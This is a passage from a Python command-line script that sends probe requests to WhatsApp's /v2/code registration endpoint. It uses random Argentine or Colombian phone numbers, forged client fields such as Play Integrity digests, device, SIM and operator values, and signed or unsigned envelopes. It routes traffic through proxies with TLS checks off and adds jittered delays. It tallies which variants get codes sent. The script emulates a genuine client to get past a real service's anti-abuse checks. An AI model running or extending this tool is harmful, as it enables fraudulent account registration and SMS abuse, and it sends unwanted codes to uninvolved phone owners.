        value = requests.utils.unquote(param.value) if param.raw else param.value
        parts.append(f"{param.key}:{len(value.encode())}:{short_hash(value)}")
    return ",".join(parts)


def post_code(material: ProbeMaterial, config: ShapeConfig, args: argparse.Namespace) -> dict[str, Any]:
    params = build_code_params(material, config, args)
    plain = render_plain(params)
    shape = param_shape(params)
    envelope_mode = "signed"
    if args.unsigned:
        envelope_mode = "unsigned"
    if args.empty_h:
        envelope_mode = "empty"
    result: dict[str, Any] = {
        "variant": config.name,
        "phone_hash": short_hash(material.e164),
        "phone_last4": material.e164[-4:],
        "field_count": len(params),
        "plain_len": len(plain),
        "shape_hash": short_hash(shape),
        "envelope_mode": envelope_mode,
    }
    if args.show_fields:
        result["fields"] = shape
        result["value_hashes"] = param_value_hashes(params)
    if args.dry_run:
        result["dry_run"] = True
        return result
    envelope = build_signed_wasafe_envelope(plain, material, envelope_mode)
    result["enc_hash"] = envelope.enc_hash
    if envelope.h_hash:
        result["h_hash"] = envelope.h_hash
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": args.user_agent or USER_AGENT,
        "WaMsysRequest": "1",
        "X-Forwarded-Host": "v.whatsapp.net",
    }
    if envelope.authorization:
        headers["Authorization"] = envelope.authorization
    try:
        response_status, parsed = post_form(args.transport, CODE_URL, headers, envelope.body, args.proxy, args.timeout)
        if not isinstance(parsed, dict):
            parsed = {"raw": parsed}
        result["http_status"] = response_status
        result.update(summarize_response(parsed))
        if args.show_response:
            result["response"] = sanitize_response(parsed)
    except Exception as exc:  # noqa: BLE001 - command-line probe must summarize network failures.
        result["error"] = sanitize_text(str(exc), args.proxy)
    return result


def post_form(transport: str, url: str, headers: dict[str, str], body: str, proxy: str, timeout: float) -> tuple[int, Any]:
    if transport == "requests":
        proxies = {"http": proxy, "https": proxy} if proxy else None
        response = requests.post(url, headers=headers, data=body, proxies=proxies, timeout=timeout, verify=False)
        try:
            parsed: Any = response.json()
        except ValueError:
            parsed = {"raw": response.text[:500]}
        return response.status_code, parsed
    if transport in {"curl", "curl-http1.1"}:
        return post_form_curl(transport, url, headers, body, proxy, timeout)
    raise ValueError(f"unknown transport: {transport}")


def post_form_curl(transport: str, url: str, headers: dict[str, str], body: str, proxy: str, timeout: float) -> tuple[int, Any]:
    with tempfile.NamedTemporaryFile("w", encoding="utf-8", delete=False) as body_file:
        body_file.write(body)
        body_path = body_file.name
    try:
        cmd = [
            "curl",
            "--silent",
            "--show-error",
            "--insecure",
            "--request",
            "POST",
            "--max-time",
            str(max(timeout, 1)),
            "--data-binary",
            "@" + body_path,
            "--write-out",
            "\n%{http_code}",
        ]
        if transport == "curl-http1.1":
            cmd.append("--http1.1")
        if proxy:
            cmd.extend(["--proxy", proxy])
        for key, value in headers.items():
            cmd.extend(["--header", f"{key}: {value}"])
        cmd.append(url)
        proc = subprocess.run(cmd, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        if proc.returncode != 0:
            raise RuntimeError(sanitize_text(proc.stderr[-500:], proxy))
        payload, _, status_text = proc.stdout.rpartition("\n")
        try:
            status = int(status_text.strip())
        except ValueError:
            status = 0
            payload = proc.stdout
        try:
            parsed: Any = json.loads(payload)
        except ValueError:
            parsed = {"raw": payload[:500]}
        return status, parsed
    finally:
        try:
            os.unlink(body_path)
        except OSError:
            pass


def config_for_variant(name: str) -> ShapeConfig:
    if name == "current":
        return ShapeConfig(name="current")
    if name == "ghcr":
        return ShapeConfig(
            name="ghcr",
            client_metrics_source="google-play|unknown",
            db="0",
            device_ram="3.53",
            pid_mode="ghcr",
            sim_signal=False,
            gpia_error_code=-2,
            gpia_data_so_digest=GHCR_GPIA_DATA_SO_DIGEST,
            gpia_source_mode="ghcr",
            gpia_escape_slash=False,
            wamsys_order="ghcr",
            wamsys_values="ghcr",
        )
    raise ValueError(f"unknown variant: {name}")


def apply_patch_name(config: ShapeConfig, patch: str) -> ShapeConfig:
    patch = patch.strip()
    patch_updates: dict[str, dict[str, Any]] = {
        "client-metrics-google-play": {"client_metrics_source": "google-play|unknown"},
        "client-metrics-unknown": {"client_metrics_source": "unknown|unknown"},
        "db-zero": {"db": "0"},
        "db-one": {"db": "1"},
        "gpia-error-minus-two": {"gpia_error_code": -2},
        "gpia-error-1005": {"gpia_error_code": 1005},
        "gpia-data-digest-ghcr": {"gpia_data_so_digest": GHCR_GPIA_DATA_SO_DIGEST},
        "gpia-data-digest-current": {"gpia_data_so_digest": CURRENT_GPIA_DATA_SO_DIGEST},
        "gpia-source-ghcr": {"gpia_source_mode": "ghcr"},
        "gpia-source-current": {"gpia_source_mode": "current"},
        "gpia-json-no-slash-escape": {"gpia_escape_slash": False},
        "gpia-json-slash-escape": {"gpia_escape_slash": True},
        "wamsys-order-ghcr": {"wamsys_order": "ghcr"},
        "wamsys-order-current": {"wamsys_order": "current"},
        "wamsys-values-ghcr": {"wamsys_values": "ghcr"},
        "wamsys-values-current": {"wamsys_values": "current"},
        "wamsys-ghcr": {"wamsys_order": "ghcr", "wamsys_values": "ghcr"},
        "no-sim-signal": {"sim_signal": False},
        "sim-signal": {"sim_signal": True},
        "operator-ar-722310": {"operator_mode": "ar722310"},
        "operator-co-732101": {"operator_mode": "co732101"},
        "operator-zero": {"operator_mode": "zero"},
        "operator-omit": {"operator_mode": "omit"},
        "device-ghcr-defaults": {"device_ram": "3.53", "pid_mode": "ghcr", "network_radio_type": "1"},
        "device-current-defaults": {"device_ram": "6.58", "pid_mode": "current", "network_radio_type": "1"},
    }
    updates = patch_updates.get(patch)
    if updates is None:
        raise ValueError(f"unknown patch: {patch}")
    patched = replace(config, **updates)
    return replace(patched, name=config.name + "+" + patch)


def patch_list(value: str) -> list[str]:
    return [item.strip() for item in value.split(",") if item.strip()]


def build_configs(args: argparse.Namespace) -> list[ShapeConfig]:
    base = config_for_variant(args.variant)
    patches = patch_list(args.patch)
    if not args.matrix:
        config = base
        for patch in patches:
            config = apply_patch_name(config, patch)
        return [apply_cli_config_overrides(config, args)]
    matrix = [base]
    for patch in patches:
        matrix.append(apply_patch_name(base, patch))
    return [apply_cli_config_overrides(config, args) for config in matrix]


def apply_cli_config_overrides(config: ShapeConfig, args: argparse.Namespace) -> ShapeConfig:
    updates: dict[str, Any] = {}
    if args.device_display_id:
        updates["device_display_id"] = args.device_display_id
    if args.device_ram:
        updates["device_ram"] = args.device_ram
    if not updates:
        return config
    return replace(config, **updates)


def list_patches() -> None:
    for patch in [
        "client-metrics-google-play",
        "client-metrics-unknown",
        "db-zero",
        "db-one",
        "gpia-error-minus-two",
        "gpia-error-1005",
        "gpia-data-digest-ghcr",
        "gpia-data-digest-current",
        "gpia-source-ghcr",
        "gpia-source-current",
        "gpia-json-no-slash-escape",
        "gpia-json-slash-escape",
        "wamsys-order-ghcr",
        "wamsys-order-current",
        "wamsys-values-ghcr",
        "wamsys-values-current",
        "wamsys-ghcr",
        "no-sim-signal",
        "sim-signal",
        "operator-ar-722310",
        "operator-co-732101",
        "operator-zero",
        "operator-omit",
        "device-ghcr-defaults",
        "device-current-defaults",
    ]:
        print(patch)


def run(args: argparse.Namespace) -> int:
    if args.list_patches:
        list_patches()
        return 0
    args.proxy = normalize_proxy(args.proxy or os.environ.get("WA_PROBE_PROXY_URL", ""))
    repo_root = Path(__file__).resolve().parents[1]
    shared_phones = phone_inputs(args) if (args.phone or args.reuse_phones) else None
    configs = build_configs(args)
    totals: dict[str, dict[str, int]] = {config.name: {"total": 0, "no_routes": 0, "ok_or_sent": 0, "errors": 0} for config in configs}
    for config in configs:
        phones = shared_phones if shared_phones is not None else phone_inputs(args)
        for index, (cc, national) in enumerate(phones, start=1):
            material = new_probe_material(repo_root, cc, national)
            row = post_code(material, config, args)
            row["probe"] = index
            print(json.dumps(row, ensure_ascii=False, sort_keys=True), flush=True)
            bucket = totals[config.name]
            bucket["total"] += 1
            if row.get("no_routes"):
                bucket["no_routes"] += 1
            if str(row.get("status", "")).lower() in {"ok", "sent"}:
                bucket["ok_or_sent"] += 1
            if row.get("error"):
                bucket["errors"] += 1
            if not args.dry_run and args.sleep > 0 and (index != len(phones) or config != configs[-1]):
                time.sleep(args.sleep + random.random() * min(args.sleep, 0.5))
    print(json.dumps({"summary": totals}, ensure_ascii=False, sort_keys=True), flush=True)
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Send WA /v2/code parameter probes with random AR/CO numbers and one-off shape patches.")
    parser.add_argument("--country", default="AR", help="random phone country; supports AR and CO")
    parser.add_argument("--cc", default="54", help="default country calling code for --phone")
    parser.add_argument("--phone", action="append", default=[], help="specific phone; can repeat. If omitted, random numbers for --country are generated")
    parser.add_argument("--count", type=int, default=5, help="random phone count when --phone is omitted")
    parser.add_argument("--proxy", default="", help="HTTP proxy URL. Prefer WA_PROBE_PROXY_URL env to avoid shell history")
    parser.add_argument("--timeout", type=float, default=25)
    parser.add_argument("--sleep", type=float, default=0.8, help="sleep between outbound requests")
    parser.add_argument("--variant", choices=["current", "ghcr"], default="current")
    parser.add_argument("--patch", default="", help="comma-separated single-parameter patch names")
    parser.add_argument("--matrix", action="store_true", help="run baseline plus each patch independently")
    parser.add_argument("--reuse-phones", action="store_true", help="reuse the same random phones across matrix variants; default is fresh phones per variant")
    parser.add_argument("--set", dest="set_param", action="append", default=[], help="override final raw param as key=value; can repeat")
    parser.add_argument("--user-agent", default="", help="override request User-Agent for device UA experiments")
    parser.add_argument("--device-display-id", default="", help="override GPIA device display ID used in _gi.did")
    parser.add_argument("--device-ram", default="", help="override device_ram map parameter")
    parser.add_argument("--omit", action="append", default=[], help="omit final param by key; can repeat")
    parser.add_argument("--unsigned", action="store_true", help="send ENC without H/Authorization for no-auth envelope comparison")
    parser.add_argument("--empty-h", action="store_true", help="send legacy ENC with an empty H value for regression comparison")
    parser.add_argument("--dry-run", action="store_true", help="render request shape only; do not send")
    parser.add_argument("--show-fields", action="store_true", help="print field order/lengths and value hashes")
    parser.add_argument("--show-response", action="store_true", help="print sanitized response payload")
    parser.add_argument("--transport", choices=["requests", "curl", "curl-http1.1"], default="requests")
    parser.add_argument("--list-patches", action="store_true")
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    try:
        return run(args)
    except Exception as exc:  # noqa: BLE001 - CLI entrypoint.
        print(json.dumps({"error": sanitize_text(str(exc), getattr(args, "proxy", ""))}, ensure_ascii=False), flush=True)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
